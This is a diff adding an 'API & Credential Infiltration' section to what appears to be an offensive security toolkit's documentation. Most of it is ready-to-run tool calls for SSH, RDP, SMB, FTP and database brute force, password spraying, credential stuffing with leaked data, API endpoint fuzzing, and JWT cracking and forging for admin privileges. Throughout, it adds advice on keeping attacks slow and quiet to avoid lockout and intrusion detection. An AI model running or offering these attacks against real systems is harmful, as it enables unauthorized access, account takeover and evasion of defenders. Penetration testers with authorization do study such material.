@@ -298,6 +298,337 @@ s3scanner_scan(
 
 ---
 
+## API & CREDENTIAL INFILTRATION (Phase 9)
+
+**Mission Enhancement:** Advanced authentication bypass, credential compromise, and API exploitation capabilities for deep target infiltration.
+
+### Multi-Protocol Credential Attacks
+
+**SSH Infiltration:**
+```python
+# Targeted SSH brute force
+hydra_attack(
+    target="192.168.1.100",
+    service="ssh",
+    username="admin",
+    password_list="/usr/share/wordlists/rockyou.txt",
+    threads=4,
+    exit_on_success=True
+)
+```
+
+**Password Spraying (Stealthy):**
+```python
+# Test one common password against many users (avoids lockout)
+hydra_attack(
+    target="corp.target.com",
+    service="ssh",
+    username_list="/usr/share/wordlists/usernames.txt",
+    password="Summer2024!",
+    threads=1,  # Slow and stealthy
+    timeout=60
+)
+```
+
+**HTTP Form Authentication Bypass:**
+```python
+# Web application login brute force
+hydra_attack(
+    target="admin.target.com",
+    service="http-post-form",
+    http_path="/login.php",
+    http_params="username=^USER^&password=^PASS^&submit=Login",
+    http_failure_string="Invalid credentials",
+    username="admin",
+    password_list="/usr/share/wordlists/passwords.txt",
+    threads=16
+)
+```
+
+**Database Credential Compromise:**
+```python
+# MySQL root access
+hydra_attack(
+    target="db.target.com",
+    service="mysql",
+    username="root",
+    password_list="/usr/share/wordlists/mysql-passwords.txt",
+    threads=8
+)
+
+# PostgreSQL infiltration
+medusa_attack(
+    target="postgres.target.com",
+    service="postgres",
+    username="postgres",
+    password_list="/usr/share/wordlists/postgres-passwords.txt",
+    module_options="DATABASE:target_db",
+    threads=4
+)
+```
+
+**SMB/Windows Network Infiltration:**
+```python
+# SMB credential attacks (creates extensive logs - use carefully)
+hydra_attack(
+    target="192.168.1.50",
+    service="smb",
+    username="Administrator",
+    password_list="/usr/share/wordlists/passwords.txt",
+    threads=2  # Low threads to reduce noise
+)
+
+# Alternative with Medusa
+medusa_attack(
+    target="192.168.1.50",
+    service="smbnt",
+    username="Administrator",
+    password_file="/usr/share/wordlists/passwords.txt",
+    threads=2,
+    verbose=True
+)
+```
+
+**RDP Remote Access:**
+```python
+# RDP brute force for remote access
+hydra_attack(
+    target="192.168.1.75",
+    service="rdp",
+    username="Administrator",
+    password_list="/usr/share/wordlists/rdp-passwords.txt",
+    threads=4
+)
+```
+
+**FTP Server Infiltration:**
+```python
+# FTP credential attacks
+medusa_attack(
+    target="ftp.target.com",
+    service="ftp",
+    username="ftpuser",
+    password_file="/usr/share/wordlists/ftp-passwords.txt",
+    threads=8
+)
+```
+
+**Credential Stuffing with Leaked Data:**
+```python
+# Use previously leaked credentials (username:password format)
+medusa_attack(
+    target="192.168.1.100",
+    service="ssh",
+    combo_file="/tmp/leaked-credentials.txt",
+    threads=8,
+    output_file="successful-logins.txt"
+)
+```
+
+### API Discovery & Exploitation
+
+**REST API Endpoint Discovery:**
+```python
+# Discover hidden API endpoints
+ffuf_api_fuzz(
+    url="https://api.target.com/v1/FUZZ",
+    wordlist="/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt",
+    method="GET",
+    match_status="200,201,202,401,403",
+    threads=40
+)
+```
+
+**GraphQL API Reconnaissance:**
+```python
+# GraphQL endpoint discovery and schema extraction
+ffuf_api_fuzz(
+    url="https://api.target.com/FUZZ",
+    wordlist="/usr/share/seclists/Discovery/Web-Content/graphql.txt",
+    method="POST",
+    headers="Content-Type: application/json",
+    data='{"query":"{__schema{types{name}}}"}',
+    filter_size="0"
+)
+```
+
+**API Parameter Fuzzing:**
+```python
+# Discover hidden parameters
+ffuf_api_fuzz(
+    url="https://api.target.com/v1/users?FUZZ=test",
+    wordlist="/usr/share/seclists/Discovery/Web-Content/api/api-parameters.txt",
+    method="GET",
+    match_status="200,500",
+    filter_lines="10"
+)
+```
+
+**Authenticated API Fuzzing:**
+```python
+# Fuzz with authentication token
+ffuf_api_fuzz(
+    url="https://api.target.com/v1/admin/FUZZ",
+    wordlist="/usr/share/seclists/Discovery/Web-Content/api/api-admin-endpoints.txt",
+    method="GET",
+    headers="Authorization: Bearer TOKEN_HERE",
+    match_status="200,201,204"
+)
+```
+
+**Multi-Point Web Fuzzing:**
+```python
+# Fuzz multiple injection points simultaneously
+wfuzz_scan(
+    url="https://target.com/api/v1/FUZZ/data?param=FUZ2Z",
+    wordlist="/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt",
+    wordlist2="/usr/share/seclists/Fuzzing/special-chars.txt",
+    show_codes="200,201,204,301,302,401,403,500"
+)
+```
+
+### JWT Token Exploitation
+
+**JWT Analysis & Weakness Detection:**
+```python
+# Decode and analyze JWT structure
+jwt_decode(token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIifQ...")
+```
+
+**JWT Secret Cracking:**
+```python
+# Brute force JWT secret (HS256/HS384/HS512)
+jwt_crack(
+    token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+    wordlist="/usr/share/wordlists/jwt-secrets.txt",
+    crack_mode="hs"
+)
+```
+
+**JWT Privilege Escalation:**
+```python
+# Forge new token with elevated privileges
+jwt_forge(
+    token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+    secret="cracked_secret_key",
+    payload='{"sub":"user123","role":"admin","permissions":["read","write","delete"]}'
+)
+```
+
+**JWT Algorithm Confusion Attack:**
+```python
+# Exploit RS256 -> HS256 algorithm confusion
+jwt_forge(
+    token="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
+    secret="-----BEGIN PUBLIC KEY-----\nMIIB...",  # Use public key as HMAC secret
+    payload='{"sub":"attacker","role":"admin"}',
+    algorithm="HS256"
+)
+```
+
+**JWT None Algorithm Bypass:**
+```python
+# Test "none" algorithm vulnerability
+jwt_forge(
+    token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+    payload='{"sub":"attacker","role":"admin"}',
+    algorithm="none"
+)
+```
+
+### Credential Attack Strategies
+
+**Strategy 1: Password Spraying (Recommended for Active Directory)**
+- One common password, many usernames
+- Avoids account lockout mechanisms
+- Low and slow approach
+- Use threads=1 for maximum stealth
+
+**Strategy 2: Credential Stuffing**
+- Use leaked username:password combinations
+- High success rate with breached data
+- Useful for initial access
+- Use combo_file parameter in Medusa
+
+**Strategy 3: Targeted Brute Force**
+- Focus on high-value accounts
+- Use customized wordlists
+- Monitor for lockout thresholds
+- Higher risk of detection
+
+**Strategy 4: Service-Specific Attacks**
+- SSH: 4-8 threads, moderate speed
+- HTTP: 16-32 threads, fast attacks
+- SMB: 1-4 threads, creates extensive logs
+- Databases: 4-8 threads, balance speed/stealth
+- RDP: 4 threads, often has lockout
+
+### Infiltration Workflow
+
+**Phase 1: API Reconnaissance**
+```python
+# Discover API structure
+ffuf_api_fuzz(url="https://api.target.com/FUZZ", wordlist="api-endpoints.txt")
+wfuzz_scan(url="https://api.target.com/v1/FUZZ", wordlist="api-paths.txt")
+```
+
+**Phase 2: Authentication Analysis**
+```python
+# Identify authentication mechanisms
+# Check for JWT, OAuth, API keys, Basic Auth, session tokens
+jwt_decode(token="captured_jwt_token")
+```
+
+**Phase 3: Credential Compromise**
+```python
+# Attempt credential-based access
+hydra_attack(target="target.com", service="http-post-form", ...)
+medusa_attack(target="target.com", service="ssh", ...)
+```
+
+**Phase 4: Token Exploitation**
+```python
+# If JWT found, attempt exploitation
+jwt_crack(token="...", wordlist="jwt-secrets.txt")
+jwt_forge(token="...", secret="cracked_secret", payload='{"role":"admin"}')
+```
+
+**Phase 5: Privilege Escalation**
+```python
+# Use compromised credentials for further access
+# Combine with cloud exploitation (Pacu) or network attacks
+```
+
+### Supported Protocols (Hydra/Medusa)
+
+**Remote Access:** ssh, telnet, rdp, vnc, rlogin, rsh, rexec
+**File Transfer:** ftp, ftps, sftp, tftp
+**Web:** http-get, http-post-form, https-get, https-post-form
+**Databases:** mysql, mssql, postgres, mongodb, oracle-listener
+**Email:** smtp, pop3, imap, smtp-vrfy
+**Network:** smb, smbnt, ldap, snmp
+**Other:** cisco, socks5, vnc, vnc, cvs, svn, nntp
+
+### Performance & Stealth Considerations
+
+**High-Speed Attacks (Detection Risk High):**
+- HTTP APIs: 16-40 threads
+- FTP: 8-16 threads
+- Useful when speed > stealth
+
+**Moderate Speed (Balanced):**
+- SSH: 4-8 threads
+- Databases: 4-8 threads
+- Standard penetration testing
+
+**Stealth Mode (Detection Risk Low):**
+- Password spraying: 1 thread
+- SMB attacks: 1-2 threads
+- Long delays between attempts
+- Useful for avoiding IDS/lockout
+
+---
+
 ## AUTHORIZATION & LEGAL COMPLIANCE
 
 ⚠️ **CRITICAL AUTHORIZATION REQUIREMENT** ⚠️
